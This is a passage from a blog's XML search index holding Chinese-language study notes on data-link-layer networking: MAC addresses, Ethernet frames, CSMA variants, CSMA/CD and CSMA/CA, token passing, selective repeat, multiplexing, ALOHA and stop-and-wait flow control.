alt="image-20210514155204831"></p><p>在局域网中，硬件地址又称为物理地址，或MAC地址。【实际上是标识符】</p><p>MAC地址：每个适配器有一个全球唯一的48位二进制地址，前24位代表厂家(由IEEE规定)，后24位厂家自己指定。常用6个十六进制数表示，如02-60-8c-e4-b1-21。</p><h3 id="以太网MAC帧"><a href="#以太网MAC帧" class="headerlink" title="以太网MAC帧"></a>以太网MAC帧</h3><p>最常用的MAC帧是以太网V2的格式</p><p><img src="/2021/05/12/ji-suan-ji-wang-luo-9/image-20210514160630276.png" alt="image-20210514160630276"></p><p>与IEEE 802.3的区别：</p><ol><li>第三个字段是长度/类型</li><li>当长度/类型字段值小于0x0600时，数据字段必须装入LLC子层。</li></ol><h3 id="高速以太网"><a href="#高速以太网" class="headerlink" title="高速以太网"></a>高速以太网</h3><ul><li><p>100BASE-T以太网</p><p>在<strong>双绞线</strong>上传送<strong>100Mb/s基带信号</strong>的<strong>星型</strong>拓扑以太网，仍使用IEE802.3的 CSMA/CD协议。</p><p>支持<strong>全双工</strong>和<strong>半双工</strong>，可在全双工方式下工作而无冲突。</p><p><img src="/2021/05/12/ji-suan-ji-wang-luo-9/image-20210514161036056.png" alt="image-20210514161036056"></p></li><li><p>吉比特以太网</p><p>在<strong>光纤或双绞线</strong>上传送<strong>1Gb/s信号</strong>。</p><p>支持<strong>全双工</strong>和<strong>半双工</strong>，可在全双工方式下工作而无冲突。</p></li><li><p>10吉比特</p><p>10吉比特以太网在<strong>光纤</strong>上传送10Gb/信号。</p><p>只支持<strong>全双工</strong>，无争用问题。</p></li></ul><blockquote><p>交换机（Switch）意为“开关”是一种用于电（光）信号转发的网络设备。它可以<strong>为接入交换机的任意两个网络节点提供独享的电信号通路</strong>。最常见的交换机是以太网交换机。其他常见的还有电话语音交换机、光纤交换机等</p></blockquote><h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p><img src="/2021/05/12/ji-suan-ji-wang-luo-9/image-20210514161446888.png" alt="image-20210514161446888"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络-8(第三章)</title>
      <link href="/2021/05/11/ji-suan-ji-wang-luo-8/"/>
      <url>/2021/05/11/ji-suan-ji-wang-luo-8/</url>
      
        <content type="html"><![CDATA[<h1 id="计算机网络-8"><a href="#计算机网络-8" class="headerlink" title="计算机网络-8"></a>计算机网络-8</h1><span id="more"></span><h2 id="3-5-3-CSMA协议"><a href="#3-5-3-CSMA协议" class="headerlink" title="3.5.3 CSMA协议"></a>3.5.3 CSMA协议</h2><p>载波监听多路访问协议CSMA(carrier sense multiple access)</p><p>CS：载波侦听/滥监听，每一个站在发送数据之前要检测一下总线上是否有其他计算机在发送数据。</p><blockquote><p>当几个站同时在总线上发送数据时，总线上的信号<strong>电压摆动值</strong>将会增大（互相叠加）。当一个站检测到的信号电压摆动值超过一定门限值时，就认为总线上至少有两个站同时在发送数据，表明产生了碰撞，即发生了冲突。</p></blockquote><p>MA：多点接入，表示许多计算机以多点接入的方式连接在一根总线上。</p><p>协议思想：发送帧之前，<strong>监听</strong>信道。</p><p><img src="/2021/05/11/ji-suan-ji-wang-luo-8/image-20210511210522636.png" alt="image-20210511210522636"></p><h3 id="1-坚持CSMA"><a href="#1-坚持CSMA" class="headerlink" title="1-坚持CSMA"></a>1-坚持CSMA</h3><p>坚持指的是对于监听信道<strong>忙</strong>之后的坚持。</p><p>1-坚持CSMA思想：</p><p>如果一个主机要发送消息，那么它先监听信道。<br><strong>空闲则直接传输，不必等待。</strong><br><strong>忙则一直监听，直到空闲马上传输。</strong><br>如果有冲突（一段时间内未收到肯定回复），则等待一个随机长的时间再监听，重复上述过程。</p><p>优点：只要媒体空闲，站点就马上发送，避免了媒体利用率的损失。</p><p>缺点：假如有两个或两个以上的站点有数据要发送，冲突就不可避免。</p><h3 id="非坚持CSMA"><a href="#非坚持CSMA" class="headerlink" title="非坚持CSMA"></a>非坚持CSMA</h3><p>非坚持指的是对于监听信道<strong>忙</strong>之后就不继续监听。</p><p>非坚持CSMA思想：</p><p>如果一个主机要发送消息，那么它先监听信道。<br><strong>空闲则直接传输，不必等待</strong>。<br><strong>忙则等待一个随机的时间之后再进行监听。</strong></p><p>优点：采用随机的重发延迟时间可以减少冲突发生的可能性。</p><p>缺点：可能存在大家都在延迟等待过程中，使得媒体仍可能处于空闲状态，媒体使用率降低。</p><h3 id="p-坚持CSMA"><a href="#p-坚持CSMA" class="headerlink" title="p-坚持CSMA"></a>p-坚持CSMA</h3><p>p-坚持指的是对于监听信道<strong>空闲</strong>的处理。</p><p>p-坚持CSMA思想：</p><p>如果一个主机要发送消息，那么它先监听信道。<br><strong>空闲则以p概率直接传输，不必等待；概率1-p等待到下一个时间槽再传输。</strong><br><strong>忙则等待一个随机的时间之后再进行监听。</strong></p><p>优点：既能像非坚持算法那样减少冲突，又能像1-坚持算法那样减少媒体空闲时间的这种方案。</p><p>缺点：发生冲突后还是坚持要把数据帧发完，造成了浪费。(CSMA/CD碰撞检测解决此问题)</p><h3 id="三种CSMA对比总结"><a href="#三种CSMA对比总结" class="headerlink" title="三种CSMA对比总结"></a>三种CSMA对比总结</h3><table><thead><tr><th></th><th>1-坚持CSMA</th><th>非坚持CSMA</th><th>p-坚持CSMA</th></tr></thead><tbody><tr><td>信道空闲</td><td>马上发</td><td>马上发</td><td>p概率马上发；1-p概率等到下一个时隙再发送</td></tr><tr><td>信道忙</td><td>继续坚持监听</td><td>放弃监听，等一个随机时间再监听</td><td>放弃监听，等一个随机时间再监听</td></tr></tbody></table><h3 id="CSMA-CD协议"><a href="#CSMA-CD协议" class="headerlink" title="CSMA/CD协议"></a>CSMA/CD协议</h3><p>载波监听多点接入/碰撞检测 CSMA/CD（carrier sense multiple access with collision detection）</p><p>CS：载波侦听/监听，每一个站在<strong>发送数据之前</strong>以及<strong>发送数据时</strong>都要检测一下总线上是否有其他计算机在发送数据。</p><p>MA：多点接入，表示许多计算机以多点接入的方式连接在一根总线上。<strong>总线型网络</strong></p><p>CD：碰撞检测（冲突检测），“<strong>边发送边监听</strong>”，适配器边发送数据边检测信道上信号电压的变化情况，以便判断自己在发送数据时其他站是否也在发送数据。<strong>半双工网络</strong></p><p>先听后发为什么还会产生冲突？</p><p>因为电磁波在总线上总是以有限的速率的速率传播的。</p><h3 id="传播时延对载波监听的影响"><a href="#传播时延对载波监听的影响" class="headerlink" title="传播时延对载波监听的影响"></a>传播时延对载波监听的影响</h3><p><img src="/2021/05/11/ji-suan-ji-wang-luo-8/image-20210511214513165.png" alt="image-20210511214513165"></p><h3 id="如何确定碰撞后的重传时机？"><a href="#如何确定碰撞后的重传时机？" class="headerlink" title="如何确定碰撞后的重传时机？"></a>如何确定碰撞后的重传时机？</h3><h4 id="截断二进制指数规避算法"><a href="#截断二进制指数规避算法" class="headerlink" title="截断二进制指数规避算法"></a>截断二进制指数规避算法</h4><p><img src="/2021/05/11/ji-suan-ji-wang-luo-8/image-20210511215327342.png" alt="image-20210511215327342"></p><p>重传的过程：<img src="/2021/05/11/ji-suan-ji-wang-luo-8/image-20210511215401492.png" alt="image-20210511215401492"></p><h5 id="一个例题"><a href="#一个例题" class="headerlink" title="一个例题"></a>一个例题</h5><p><img src="/2021/05/11/ji-suan-ji-wang-luo-8/image-20210511215521867.png" alt="image-20210511215521867"></p><h3 id="最小帧长问题"><a href="#最小帧长问题" class="headerlink" title="最小帧长问题"></a>最小帧长问题</h3><p><img src="/2021/05/11/ji-suan-ji-wang-luo-8/image-20210511215705952.png" alt="image-20210511215705952"></p><p>所以我们需要定义一个<strong>最小帧长</strong></p><p><strong>帧的传输时延至少要两倍于信号在总线中的传播时延。</strong></p><p><img src="/2021/05/11/ji-suan-ji-wang-luo-8/image-20210511215816632.png" alt="image-20210511215816632"></p><p><img src="/2021/05/11/ji-suan-ji-wang-luo-8/image-20210511220023416.png" alt="image-20210511220023416"></p><p>​               </p><blockquote><p>以太网规定最短帧长为64B，凡是长度小于64B的都是由于冲突而异常终止的无效帧</p></blockquote><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><img src="/2021/05/11/ji-suan-ji-wang-luo-8/image-20210511220145355.png" alt="image-20210511220145355"></p><h2 id="3-5-4-CSMA-CA协议"><a href="#3-5-4-CSMA-CA协议" class="headerlink" title="3.5.4 CSMA/CA协议"></a>3.5.4 CSMA/CA协议</h2><p><em>相较于CD，了解CA即可</em></p><p>载波监听多点接入/碰撞避免 CSMA/CA（carrier sense multiple access with collision avoidance）</p><p><img src="/2021/05/11/ji-suan-ji-wang-luo-8/image-20210512102054964.png" alt="image-20210512102054964"></p><h3 id="CSMA-CA协议工作原理"><a href="#CSMA-CA协议工作原理" class="headerlink" title="CSMA/CA协议工作原理"></a>CSMA/CA协议工作原理</h3><p>发送数据前，先检测信道是否空闲。</p><p>空闲则发出RTS（request to send），RTS包括发射端的地址、接收端的地址、下一份数据将持续发送的时间等信息；信道忙则等待。</p><p>接收端收到RTS后，将响应CTS（clear to send）。</p><p>发送端收到CTS后，开始发送数据帧（同时<strong>预约信道</strong>：发送方告知其他站点自己要传多久数据）。</p><p>接收端收到数据帧后，将用CRC来检验数据是否正确，正确则响应<strong>ACK帧</strong>。</p><p>发送方收到ACK就可以进行下一个数据帧的发送，若没有则一直重传至规定重发次数为止（采用<strong>二进制指数退避算法</strong>来确定随机的推迟时间）。</p><p>CA中使用的三个机制来实现碰撞避免：</p><ol><li><p>预约信道</p></li><li><p>ACK帧</p></li><li><p>RTS/CTS帧(可选)</p><p>可用可不用，主要来解决隐蔽站问题</p></li></ol><h3 id="CSMA-CD与CSMA-CA异同"><a href="#CSMA-CD与CSMA-CA异同" class="headerlink" title="CSMA/CD与CSMA/CA异同"></a>CSMA/CD与CSMA/CA异同</h3><p><strong>相同点：</strong>CSMA/CD与 CSMA/CA机制都从属于CSMA的思路，其核心是先听再说。换言之，两个在接入信道之前都须要进行监听。当发现信道空闲后，才能进行接入。</p><p><strong>不同点：</strong></p><ol><li><strong>传输介质不同</strong>：CSMA/CD用于总线式以太网【有线】，而 CSMA/CA用于无线局域网【无线】。</li><li><strong>载波检测方式不同</strong>：因<strong>传输介质不同</strong>，CSMA/CD与 CSMA/CA的<strong>检测方式也不同</strong>。CSMA/CD通过电缆中电压的变化来检测，当数据发生碰撞时，电缆中的电压就会随着发生变化；而 CSMA/CA采用能量检测（ED）<br>载波检测（CS）和能量载波混合检测三种检测信道空闲的方式。</li><li><strong>CSMA/CD检测冲突，CSMA/CA避免冲突</strong>，二者出现冲突后都会进行有上限的重传。</li></ol><h2 id="3-5-5-轮询访问介质访问控制"><a href="#3-5-5-轮询访问介质访问控制" class="headerlink" title="3.5.5 轮询访问介质访问控制"></a>3.5.5 轮询访问介质访问控制</h2><h3 id="介质访问控制"><a href="#介质访问控制" class="headerlink" title="介质访问控制"></a>介质访问控制</h3><p>信道划分介质访问控制(<strong>MAC</strong> Multiple Access Control)协议：</p><ul><li>基于<strong>多路复用</strong>技术划分资源。</li><li>网络负载重：共享信道效率高，且公平。</li><li>网络负载轻：共享信道效率低。</li></ul><p>随机访问MAC协议：<strong>会产生冲突</strong></p><ul><li>用户根据自己的意愿<strong>随机</strong>发送信息，发送信息时可独占信道带宽。</li><li>网络负载重：产生冲突开销。</li><li>网络负载轻：共享信道效率高，单个结点可利用信道全部带宽。</li></ul><p>轮询访问MAC协议/轮流协议/轮转访问MAC协议：</p><ul><li>既要<strong>不产生冲突</strong>，又要<strong>发送时占全部带宽</strong>。</li><li>包括 ：轮询协议和<strong>令牌传递协议</strong></li></ul><h3 id="轮询协议"><a href="#轮询协议" class="headerlink" title="轮询协议"></a>轮询协议</h3><p>了解过程即可</p><p>主节点轮流“邀请”从属结点发送数据。</p><p><img src="/2021/05/11/ji-suan-ji-wang-luo-8/image-20210512110725062.png" alt="image-20210512110725062"></p><p>存在的问题：</p><ol><li>轮流开销</li><li>等待延迟</li><li>单点故障(主节点故障)</li></ol><h3 id="令牌传递协议"><a href="#令牌传递协议" class="headerlink" title="令牌传递协议"></a>令牌传递协议</h3><p>令牌：一个特殊格式的MAC帧，不含任何信息。</p><p>​           控制信道的使用，确保同一时刻只有一个节点独占信道。</p><p><strong>令牌环网无碰撞</strong></p><p><img src="/2021/05/11/ji-suan-ji-wang-luo-8/image-20210512111432173.png" alt="image-20210512111432173"></p><p>每个结点都可以在一定的时间内(令牌持有时间)获得发送次数据的权力，并不是无限制的持有令牌。</p><p>存在的问题：</p><ol><li>令牌开销</li><li>等待延迟</li><li>单点故障(某个主机故障)</li></ol><p>应用于令牌环网（物理星型拓扑，逻辑环形拓扑）。</p><p>釆用令牌传送方式的网络常用于<strong>负载较重、通信量较大</strong>的网络中。</p><h2 id="MAC协议总结"><a href="#MAC协议总结" class="headerlink" title="MAC协议总结"></a>MAC协议总结</h2><p><img src="/2021/05/11/ji-suan-ji-wang-luo-8/image-20210512111905009.png" alt="image-20210512111905009"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络-7(第三章)</title>
      <link href="/2021/05/11/ji-suan-ji-wang-luo-7/"/>
      <url>/2021/05/11/ji-suan-ji-wang-luo-7/</url>
      
        <content type="html"><![CDATA[<h1 id="计算机网络-7"><a href="#计算机网络-7" class="headerlink" title="计算机网络-7"></a>计算机网络-7</h1><span id="more"></span><h2 id="3-4-4-选择重传协议-SR"><a href="#3-4-4-选择重传协议-SR" class="headerlink" title="3.4.4 选择重传协议(SR)"></a>3.4.4 选择重传协议(SR)</h2><h3 id="选择重传协议的滑动窗口"><a href="#选择重传协议的滑动窗口" class="headerlink" title="选择重传协议的滑动窗口"></a>选择重传协议的滑动窗口</h3><p><img src="/2021/05/11/ji-suan-ji-wang-luo-7/image-20210511165313934.png" alt="image-20210511165313934"></p><h3 id="SR中发送方必须响应的三件事"><a href="#SR中发送方必须响应的三件事" class="headerlink" title="SR中发送方必须响应的三件事"></a>SR中发送方必须响应的三件事</h3><h4 id="1-上层的调用"><a href="#1-上层的调用" class="headerlink" title="1.上层的调用"></a>1.上层的调用</h4><p>从上层收到数据后，SR发送方检査下一个可用于该帧的序号，如果序号位于发送窗口内，则发送数据帧；否则就像GBN一样，要么将数据<strong>缓存</strong>，要么<strong>返回给上层</strong>之后再传输。</p><h4 id="2-收到一个ACK"><a href="#2-收到一个ACK" class="headerlink" title="2.收到一个ACK"></a>2.收到一个ACK</h4><p>如果收到ACK，假如该帧序号在窗口内，则SR发送方将那个被确认的帧标记为已接收。如果该帧序号是窗口的下界（最左边第一个窗口对应的序号），则窗口向前移动到具有最小序号的未确认帧处。如果窗口移动了并且有序号在窗口内的未发送帧，则发送这些帧。</p><h4 id="3-超时事件"><a href="#3-超时事件" class="headerlink" title="3.超时事件"></a>3.超时事件</h4><p>每个帧都有自己的定时器，一个超时事件发生后<strong>只重传一个帧</strong>。</p><h3 id="SR接收方要做的事"><a href="#SR接收方要做的事" class="headerlink" title="SR接收方要做的事"></a>SR接收方要做的事</h3><p>SR接收方将<strong>确认一个正确接收的帧</strong>而<strong>不管其是否按序</strong>。失序的帧将被<strong>缓存</strong>，并返回给发送方一个该帧的确认帧<strong>【收谁确认谁】</strong>，直到所有帧（即序号更小的帧）皆被收到为止，这时才可以将一批帧按序交付给上层，然后<strong>向前移动滑动窗口</strong>。</p><p>​    <img src="/2021/05/11/ji-suan-ji-wang-luo-7/image-20210511170608909.png" alt="image-20210511170608909"></p><p>如果收到了窗口序号外（小于窗口下界）的帧，就返回一个ACK。<br>其他情况，就忽略该帧。</p><p>之所以又收到了小于窗口下界的帧，可能是因为我们收到帧时返回的ACK超时或者丢失，发送方又超时重传了，此时再次返回一个ACK即可。</p><h3 id="运送中的SR"><a href="#运送中的SR" class="headerlink" title="运送中的SR"></a>运送中的SR</h3><p><img src="/2021/05/11/ji-suan-ji-wang-luo-7/image-20210511171256689.png" alt="image-20210511171256689"></p><h3 id="滑动窗口的长度"><a href="#滑动窗口的长度" class="headerlink" title="滑动窗口的长度"></a>滑动窗口的长度</h3><p><img src="/2021/05/11/ji-suan-ji-wang-luo-7/image-20210511171735687.png" alt="image-20210511171735687"></p><p>这种情况下俩种0号帧是不同的，我们无法知道0号帧是超时重传的还是新的，产生了二义性问题。</p><p>发送窗口最好等于接收窗口。(大了会溢出，小了没意义)</p><p><img src="/2021/05/11/ji-suan-ji-wang-luo-7/image-20210511172306147.png" alt="image-20210511172306147"></p><h3 id="SR中重点总结"><a href="#SR中重点总结" class="headerlink" title="SR中重点总结"></a>SR中重点总结</h3><p>1.对数据帧逐一确认，收一个确认一个。</p><p>2.只重传出错的帧。</p><p>3.接收方有缓存。</p><p>4.<img src="/2021/05/11/ji-suan-ji-wang-luo-7/image-20210511172450667.png" alt="image-20210511172450667"></p><h3 id="一道习题"><a href="#一道习题" class="headerlink" title="一道习题"></a>一道习题</h3><p><img src="/2021/05/11/ji-suan-ji-wang-luo-7/image-20210511172841037.png" alt="image-20210511172841037"></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><img src="/2021/05/11/ji-suan-ji-wang-luo-7/image-20210511172955777.png" alt="image-20210511172955777"></p><h2 id="3-5-1-信道划分介质访问控制"><a href="#3-5-1-信道划分介质访问控制" class="headerlink" title="3.5.1 信道划分介质访问控制"></a>3.5.1 信道划分介质访问控制</h2><h3 id="传输数据使用的俩种链路"><a href="#传输数据使用的俩种链路" class="headerlink" title="传输数据使用的俩种链路"></a>传输数据使用的俩种链路</h3><p><strong>点对点链路：</strong></p><p>俩个相邻结点通过一个链路相连，没有第三者。</p><p>应用：ppp协议，常用于<strong>广域网</strong>。</p><p><strong>广播式链路：</strong></p><p>所有主机共享通信介质。</p><p>应用：早期的总线以太网、无线局域网，常用于<strong>局域网</strong>。</p><p>典型拓扑结构：总线型、星型(逻辑总线型)</p><h3 id="介质访问控制"><a href="#介质访问控制" class="headerlink" title="介质访问控制"></a>介质访问控制</h3><p>介质访问控制的内容就是，采取一定的措施，使得俩对节点之间的通信不会发生互相干扰的情况。</p><p>介质访问控制分为：</p><ul><li>静态划分信道；</li><li>动态划分信道；</li></ul><p>静态划分信道–<strong>信道划分介质访问控制</strong>：</p><ul><li>频分多路复用 FDM；F=frequency</li><li>时分多路复用 TDM；T=time</li><li>波分多路复用 WDM；W=wave</li><li>码分多路复用 CDM；C=code</li></ul><p>动态分配信道(动态媒体接入控制/多点接入)包括：</p><blockquote><p>特点：信道并非在用户通信时固定分配给用户</p></blockquote><ul><li>轮询访问介质访问控制  令牌传递协议</li><li>随机访问介质访问控制(所有用户可随机发送信息，发送信息时占<strong>全部带宽</strong>)</li></ul><p><strong>随机访问介质访问控制</strong>：</p><ul><li>ALOHA协议</li><li>CSMA协议</li><li><strong>CSMA/CD协议</strong></li><li><strong>CSMA/CA协议</strong></li></ul><p><img src="/2021/05/11/ji-suan-ji-wang-luo-7/image-20210511175243142.png" alt="image-20210511175243142"></p><h3 id="信道划分介质访问控制"><a href="#信道划分介质访问控制" class="headerlink" title="信道划分介质访问控制"></a>信道划分介质访问控制</h3><p>信道划分介质访问控制：将使用介质的每个设备与来自同一信道上的其他设备的通信隔离开，把<strong>时域和频域资源</strong>合理的分配给网络上的设备。</p><p><img src="/2021/05/11/ji-suan-ji-wang-luo-7/image-20210511185709781.png" alt="image-20210511185709781"></p><h3 id="频分多路复用-FDM"><a href="#频分多路复用-FDM" class="headerlink" title="频分多路复用 FDM"></a>频分多路复用 FDM</h3><p><img src="/2021/05/11/ji-suan-ji-wang-luo-7/image-20210511190049618.png" alt="image-20210511190049618"></p><p>用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带。<strong>频分复用的所有用户在同样的时间占用不同的带宽（频率带宽）资源</strong>。</p><p>优点：充分利用传输介质带宽，系统<strong>效率较高</strong>；由于技术比较成熟，实现也比较<strong>容易</strong>。</p><h3 id="时分复用-TDM"><a href="#时分复用-TDM" class="headerlink" title="时分复用 TDM"></a>时分复用 TDM</h3><p><img src="/2021/05/11/ji-suan-ji-wang-luo-7/image-20210511190522993.png" alt="image-20210511190522993"></p><p>将时间划分为一段段等长的时分复用帧（TDM帧）。每一个时分复用的用户在每一个TDM帧中占用<strong>固定序号的时隙</strong>，所有用户轮流占用信道。</p><p>频分复用–操作系统中的“并行”</p><p>时分复用–操作系统中的“并发”</p><p>每个用户隔一段时间才能占用信道，等待时间比较久，信道利用率低。</p><h3 id="改进的时分复用–统计时分复用STDM"><a href="#改进的时分复用–统计时分复用STDM" class="headerlink" title="改进的时分复用–统计时分复用STDM"></a>改进的时分复用–统计时分复用STDM</h3><p><img src="/2021/05/11/ji-suan-ji-wang-luo-7/image-20210511191500076.png" alt="image-20210511191500076"></p><p>每一个STDM帧中的时隙数小于连接在集中器上的用户数。各用户有了数据就随时发往集中器的<strong>输入缓存</strong>，然后集中器按顺序依次扫描输入缓存，把缓存中的输入数据放入STDM帧中，一个STDM帧满了就发出。<strong>STDM帧不是固定分配时隙，而是按需动态分配时隙</strong>。</p><h3 id="波分多路复用-WDM"><a href="#波分多路复用-WDM" class="headerlink" title="波分多路复用 WDM"></a>波分多路复用 WDM</h3><p>了解原理即可</p><p>波分多路复用就是<strong>光的频分多路复用</strong>，在一根光纤中传输多种不同波长（频率）的光信号，由于波长（频率）不同，所以各路光信号互不干扰，最后再用波长分解复用器将各路波长分解出来。</p><p><img src="/2021/05/11/ji-suan-ji-wang-luo-7/image-20210511191906177.png" alt="image-20210511191906177"></p><h3 id="码分多路复用-CDM"><a href="#码分多路复用-CDM" class="headerlink" title="码分多路复用 CDM"></a><strong>码分多路复用 CDM</strong></h3><p>码分多址(CDMA)是码分复用的一种形式。</p><p>1个比特分为多个码片/片（chip），每一个站点被指定一个唯一的m位的芯片序列。</p><p>发送1时站点发送芯片序列，发送0时发送芯片序列反码（通常把0写成1）。</p><p><strong>如何不打架：多个站点同时发送数据的时候，要求各个站点芯片序列相互正交。</strong></p><blockquote><p>正交：即规格内积化为0</p><p>规格内积化：芯片序列对应的各位相乘再相加再除以总的位数</p></blockquote><p><strong>如何合并：各路数据在信道中被线性相加</strong>。</p><p><strong>如何分离：合并的数据和源站规格化内积。</strong></p><p><img src="/2021/05/11/ji-suan-ji-wang-luo-7/image-20210511194800774.png" alt="image-20210511194800774"></p><h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p><img src="/2021/05/11/ji-suan-ji-wang-luo-7/image-20210511194952252.png" alt="image-20210511194952252"></p><h3 id="3-5-2-ALOHA协议"><a href="#3-5-2-ALOHA协议" class="headerlink" title="3.5.2 ALOHA协议"></a>3.5.2 ALOHA协议</h3><p>ALOHA协议分为：</p><ul><li>纯ALOHA协议</li><li>时隙ALOHA协议</li></ul><h3 id="纯ALOHA协议"><a href="#纯ALOHA协议" class="headerlink" title="纯ALOHA协议"></a>纯ALOHA协议</h3><p>纯 ALOHA协议思想：不监听信道，不按时间槽发送，随机重发。<strong>想发就发</strong>。</p><p><img src="/2021/05/11/ji-suan-ji-wang-luo-7/image-20210511203104554.png" alt="image-20210511203104554"></p><p>冲突如何检测？</p><p>如果发生冲突，接收方在就会检测出差错，然后不予确认，发送方在一定时间内收不到就判断发生冲突。</p><p>冲突如何解决？</p><p>超时后等一随机时间再重传。</p><h3 id="时隙ALOHA协议"><a href="#时隙ALOHA协议" class="headerlink" title="时隙ALOHA协议"></a>时隙ALOHA协议</h3><p>时隙 ALOHA协议的思想：把时间分成若干个相同的时间片，所有用户在时间片开始时刻同步接入网络信道，若发生冲突，则必须等到下一个时间片开始时刻再发送。<strong>控制想发就发的随意性。</strong></p><p><img src="/2021/05/11/ji-suan-ji-wang-luo-7/image-20210511203749114.png" alt="image-20210511203749114"></p><h3 id="关于ALOHA协议要知道的事"><a href="#关于ALOHA协议要知道的事" class="headerlink" title="关于ALOHA协议要知道的事"></a>关于ALOHA协议要知道的事</h3><p> 1.纯 ALOHA比时隙 ALOHA吞吐量更低，效率更低。</p><blockquote><p>吞吐量：指在一段时间内成功发送的平均帧数。</p></blockquote><p>2.纯 ALOHA想发就发，时隙 ALOHA只有在时间片段开始时才能发。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络-6(第三章)</title>
      <link href="/2021/05/10/ji-suan-ji-wang-luo-6/"/>
      <url>/2021/05/10/ji-suan-ji-wang-luo-6/</url>
      
        <content type="html"><![CDATA[<h1 id="计算机网络-6"><a href="#计算机网络-6" class="headerlink" title="计算机网络-6"></a>计算机网络-6</h1><span id="more"></span><h2 id="3-4-1-流量控制与可靠传输机制"><a href="#3-4-1-流量控制与可靠传输机制" class="headerlink" title="3.4.1 流量控制与可靠传输机制"></a>3.4.1 流量控制与可靠传输机制</h2><h3 id="数据链路层的流量控制"><a href="#数据链路层的流量控制" class="headerlink" title="数据链路层的流量控制"></a>数据链路层的流量控制</h3><p>较高的发送速度和较低的接收能力的不匹配，会造成传输出错，因此流量控制也是数据链路层的一项重要工作。</p><p>数据链路层额传输控制是点对点的，而传输层的流量控制是端到端的。</p><p>数据链路层流量控制手段:接收方收不下就不回复确认。</p><p>传输层流量控制手段：接收端给发送端一个窗口公告。</p><h3 id="流量控制方法"><a href="#流量控制方法" class="headerlink" title="流量控制方法"></a>流量控制方法</h3><h4 id="停止-等待协议"><a href="#停止-等待协议" class="headerlink" title="停止-等待协议"></a>停止-等待协议</h4><p><strong>停止-等待协议</strong>：每发送一个帧就停止发送给，等待对方的确认，在收到确认收再发送下一个帧。</p><p><img src="/2021/05/10/ji-suan-ji-wang-luo-6/image-20210510133910871.png" alt="image-20210510133910871"></p><h4 id="滑动窗口协议"><a href="#滑动窗口协议" class="headerlink" title="滑动窗口协议"></a>滑动窗口协议</h4><p>滑动窗口协议包括：后退N帧协议(GBN)，选择重传协议(SR)</p><p><img src="/2021/05/10/ji-suan-ji-wang-luo-6/image-20210510134445132.png" alt="image-20210510134445132"></p><p> 停止等待协议也是一种特殊的滑动窗口协议</p><h4 id="对比三种协议的窗口大小"><a href="#对比三种协议的窗口大小" class="headerlink" title="对比三种协议的窗口大小"></a>对比三种协议的窗口大小</h4><p>停止-等待协议   发送窗口大小=1，接收窗口大小=1；</p><p>后退N帧协议(GBN)   发送窗口大小&gt;1，接收窗口大小=1；</p><p>选择重传协议(SR)   发送窗口大小&gt;1，接收窗口大小&gt;1；</p><p>链路层的滑动窗口协议窗口的大小在传输过程中是固定的。</p><h3 id="可靠传输、滑动窗口、流量控制三者关系"><a href="#可靠传输、滑动窗口、流量控制三者关系" class="headerlink" title="可靠传输、滑动窗口、流量控制三者关系"></a>可靠传输、滑动窗口、流量控制三者关系</h3><p>可靠传输：发送端发啥，接收端收啥。</p><p>流量控制：控制发送速率，使接收方有足够缓冲空间来接收每一个帧。</p><p>滑动窗口解决：</p><ul><li>流量控制(收不下就不给确认，想发也发不了)</li><li>可靠传输(发送方自动重传)</li></ul><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><img src="/2021/05/10/ji-suan-ji-wang-luo-6/image-20210510135423159.png" alt="image-20210510135423159"></p><h2 id="3-4-2-停止-等待协议"><a href="#3-4-2-停止-等待协议" class="headerlink" title="3.4.2 停止-等待协议"></a>3.4.2 停止-等待协议</h2><h3 id="为什么要有停止等待协议"><a href="#为什么要有停止等待协议" class="headerlink" title="为什么要有停止等待协议"></a>为什么要有停止等待协议</h3><p>除了比特出差错，底层信道还会出现丢包问题。为了实现流量控制。</p><pre class="line-numbers language-none"><code class="language-none">丢包：物理线路故障，设备故障，病毒攻击，路由信息错误等原因，会导致数据包丢失。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="研究停止等待协议的前提"><a href="#研究停止等待协议的前提" class="headerlink" title="研究停止等待协议的前提"></a>研究停止等待协议的前提</h3><p>虽然现在常用全双工通信方式，但为了讨论问题方便，仅考虑一方发送数据（发送方），一方接收数据（接收方）。</p><p>因为是在讨论可靠传输的原理，所以并不考虑数据是在哪一个层次上传送的。</p><p>“停止等待”就是每发送完一个分组就停止发送，等待对方确认，在收到确认后再发送下一个分组。</p><h3 id="停止等待协议有几种应用情况？"><a href="#停止等待协议有几种应用情况？" class="headerlink" title="停止等待协议有几种应用情况？"></a>停止等待协议有几种应用情况？</h3><p>无差错情况和有差错情况</p><h3 id="停止等待协议–无差错情况"><a href="#停止等待协议–无差错情况" class="headerlink" title="停止等待协议–无差错情况"></a>停止等待协议–无差错情况</h3><p><img src="/2021/05/10/ji-suan-ji-wang-luo-6/image-20210510140749054.png" alt="image-20210510140749054"></p><h3 id="停止等待协议–有差错情况"><a href="#停止等待协议–有差错情况" class="headerlink" title="停止等待协议–有差错情况"></a>停止等待协议–有差错情况</h3><h4 id="1-数据帧丢失或检测到帧出错"><a href="#1-数据帧丢失或检测到帧出错" class="headerlink" title="1.数据帧丢失或检测到帧出错"></a>1.数据帧丢失或检测到帧出错</h4><p><img src="/2021/05/10/ji-suan-ji-wang-luo-6/image-20210510141809722.png" alt="image-20210510141809722"></p><h4 id="2-ACK丢失"><a href="#2-ACK丢失" class="headerlink" title="2.ACK丢失"></a>2.ACK丢失</h4><p><img src="/2021/05/10/ji-suan-ji-wang-luo-6/image-20210510141948546.png" alt="image-20210510141948546"></p><h4 id="3-ACK迟到"><a href="#3-ACK迟到" class="headerlink" 